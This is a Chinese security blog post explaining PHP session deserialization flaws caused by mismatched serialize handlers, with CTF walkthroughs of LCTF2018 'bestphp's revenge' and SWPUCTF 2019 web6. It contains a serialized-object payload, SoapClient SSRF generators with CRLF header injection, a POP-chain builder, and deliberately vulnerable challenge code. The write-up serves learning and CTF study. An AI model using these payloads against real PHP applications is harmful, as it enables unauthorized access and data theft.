---
title: php session反序列化
author: ch3n9w
date: 2019-09-02 13:40:59
categories: 安全研究
typora-root-url: ../
---



php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:

<!--more-->

## session反序列化漏洞



- 特征
  - phpinfo中默认的session.serialize_handler和本地的值不一样
  - ini_set('session.serialize_handler', 'php');之类的
  - phpinfo中session.upload_progress.enabled打开



一旦发现脚本中的序列化处理器和php.ini设置的不一样,就可能导致这个漏洞.

php 的 session 都是以文件的形式进行存储的, 常见的位置如下

```
/var/lib/php/sess_xxxxx
/var/lib/php/sessions/sess_xxxxx
/tmp/sess_xxxxx
/tmp/sessions/sess_xxxxx
```



php用于存取session时候的三种处理器

```
php:键名 ＋ 竖线 ＋ 序列化字符串
php_binary: 键名的长度对应的 ASCII 字符 ＋ 键名 ＋序列化字符串
php_serialize: 序列化字符串
```

在没有对session进行配置的情况下, 默认使用php序列化处理模式.

如果以php_serialize 方式存取但是又用php处理器去处理, 那么只要传入的字符串中有 | 就可以导致php处理器将 | 前的东东解释成键, 而将后面的东西解释称值, 而后面的东西一般就是要反序列化的字符串了.

>  php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session, 所以这个洞要看版本

将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控

> 当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。_
>
> _当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，
> 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。

上传表单

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

其中目标网址需要替换, php_session_upload_progress是session.upload_progress.name的名字, 从phpinfo中看.

然后随便传点什么进去. 在burpsuite中做如下修改

将随便传的文件的filename成payload, 比如

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

这里的斜杆是为了防止转义.签名的竖线就是帮助php处理器解释使用的.

 

## 例题LCTF2018-bestphp’s revenge 

题目直接给出了源代码

```php
<?php

highlight_file(__FILE__);

$b = 'implode';

call_user_func($_GET['f'], $_POST);

session_start();
if (isset($_GET['name'])) {
        $_SESSION['name'] = $_GET['name'];
}
var_dump($_SESSION);
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
?>
```

整理一下

- call_user_func: 第一个参数是回调函数的名字,第二个之后的参数是回调函数的参数,**特别的,如果传入的是一个数组的话,他会将数组的第一项识别为类和对象,并将之后的参数作为类和对象的方法来调用**.

- reset会将数组的第一项作为字符串输出
- implode 函数只是合并数组的时候插入一些给定字符而已,无关紧要.

扫描目录发现了flag.php

```php
session_start();
echo 'only localhost can get flag!';
$flag = 'LCTF{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
only localhost can get flag!
```

规定localhost访问,那么必须要找到ssrf的机会.

题目提示反序列化,但是题目源码中没有任何给定的类,在此情况下只能考虑php的原生类.本题采用的是SoapClient类.在这个类的对象调用未知的方法时候就会调用call函数,同时触发请求,这个类支持http/https, 简单的使用实例如下:

```php
<?php
$url = "http://127.0.0.1:12334/flag.php";
$b = new SoapClient(null, array('uri' => $url, 'location' =>$url));
$a = serialize($b);
$c = unserialize($a);
$c->a();
?>
```

nc 接受:

![image-20211114141858477](/images/php的两类反序列化/image-20211114141858477.png)

那么可以这样子:

- call_user_func('session_start','serialize_handler=php_serialize')提前开启php session并规定好本地的serialize_handler为php_serialize, 而默认的session序列化处理器为php,这就会导致上面说到的session反序列化漏洞.当然,name的值是竖线加上SoapClient序列化字符串,uri和location的值都指向flag.php
- session存取完成之后就要想办法去反序列化和触发未知方法,这里使用变量覆盖(**extract**)将b覆盖为call_user_func,因为b有机会接受session反序列化的字符串,并将数组传入b中,调用welcome_to_the_lctf2018方法,从而触发call函数,造成ssrf
- 最后**ssrf的结果也会存放在sessoin中**,所以获取SoapClient的PHPSSID并去访问index.php(里面有var_dump(session))得到flag



![image-20211114141906159](/images/php的两类反序列化/image-20211114141906159.png)





![image-20211114141914122](/images/php的两类反序列化/image-20211114141914122.png)

![image-20211114141921940](/images/php的两类反序列化/image-20211114141921940.png)



## SWPUCTF 2019 web6

前面部分省略, 来到源码部分

```php
<?php


ini_set('session.serialize_handler', 'php');

class aa
{
        public $mod1;
        public $mod2;
        public function __call($name,$param)
        {
            if($this->{$name})
                {
                    $s1 = $this->{$name};
                    $s1();
                }
        }
        public function __get($ke)
        {
            return $this->mod2[$ke];
        }
}


class bb
{
        public $mod1;
        public $mod2;
        public function __destruct()
        {
            $this->mod1->test2();
        }
} 

class cc
{
        public $mod1;
        public $mod2;
        public $mod3;
        public function __invoke()
        {
                $this->mod2 = $this->mod3.$this->mod1;
        } 
}

class dd
{
        public $name;
        public $flag;
        public $b;
        
        public function getflag()
        {
                session_start(); 
                var_dump($_SESSION);
                $a = array(reset($_SESSION),$this->flag);
                echo call_user_func($this->b,$a);
        }
}
class ee
{
        public $str1;
        public $str2;
        public function __toString()
        {
                $this->str1->{$this->str2}();
                return "1";
        }
}

$a = $_POST['aa'];
unserialize($a);
?>

```

ssrf生成session反序列化

```php
<?php
$target = 'http://127.0.0.1/interface.php';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: user=xZmdm9NxaQ==',
);

$b = new SoapClient(null, array('location' => $target, 'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers),'uri'=>'aabb'));
$a = serialize($b);
$a = str_replace('^^', "\r\n", $a);
echo $a;
// echo urlencode($a);

```

序列化生成, 触发反序列化后进而触发session的反序列化

```php
$first = new bb();
$second = new aa();
$third = new cc();
$four = new ee();
$first ->mod1 = $second;
$third -> mod1 = $four;
$f = new dd();
$f->flag='Get_flag';
$f->b='call_user_func';
$four -> str1 = $f;
$four -> str2 = "getflag";
$second ->mod2['test2'] = $third;

echo serialize($first);
```

> PHPSESSID随便指定写一个比如kk默认情况下会生成sess_kk session文件

![image-20211114141933229](/images/php的两类反序列化/image-20211114141933229.png)



![image-20211114141940499](/images/php的两类反序列化/image-20211114141940499.png)



参考

https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/

 http://www.91ri.org15925.html

https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO

https://blog.spoock.com/2016/10/16/php-serialize-problem/

https://www.freebuf.com/vuls/202819.html

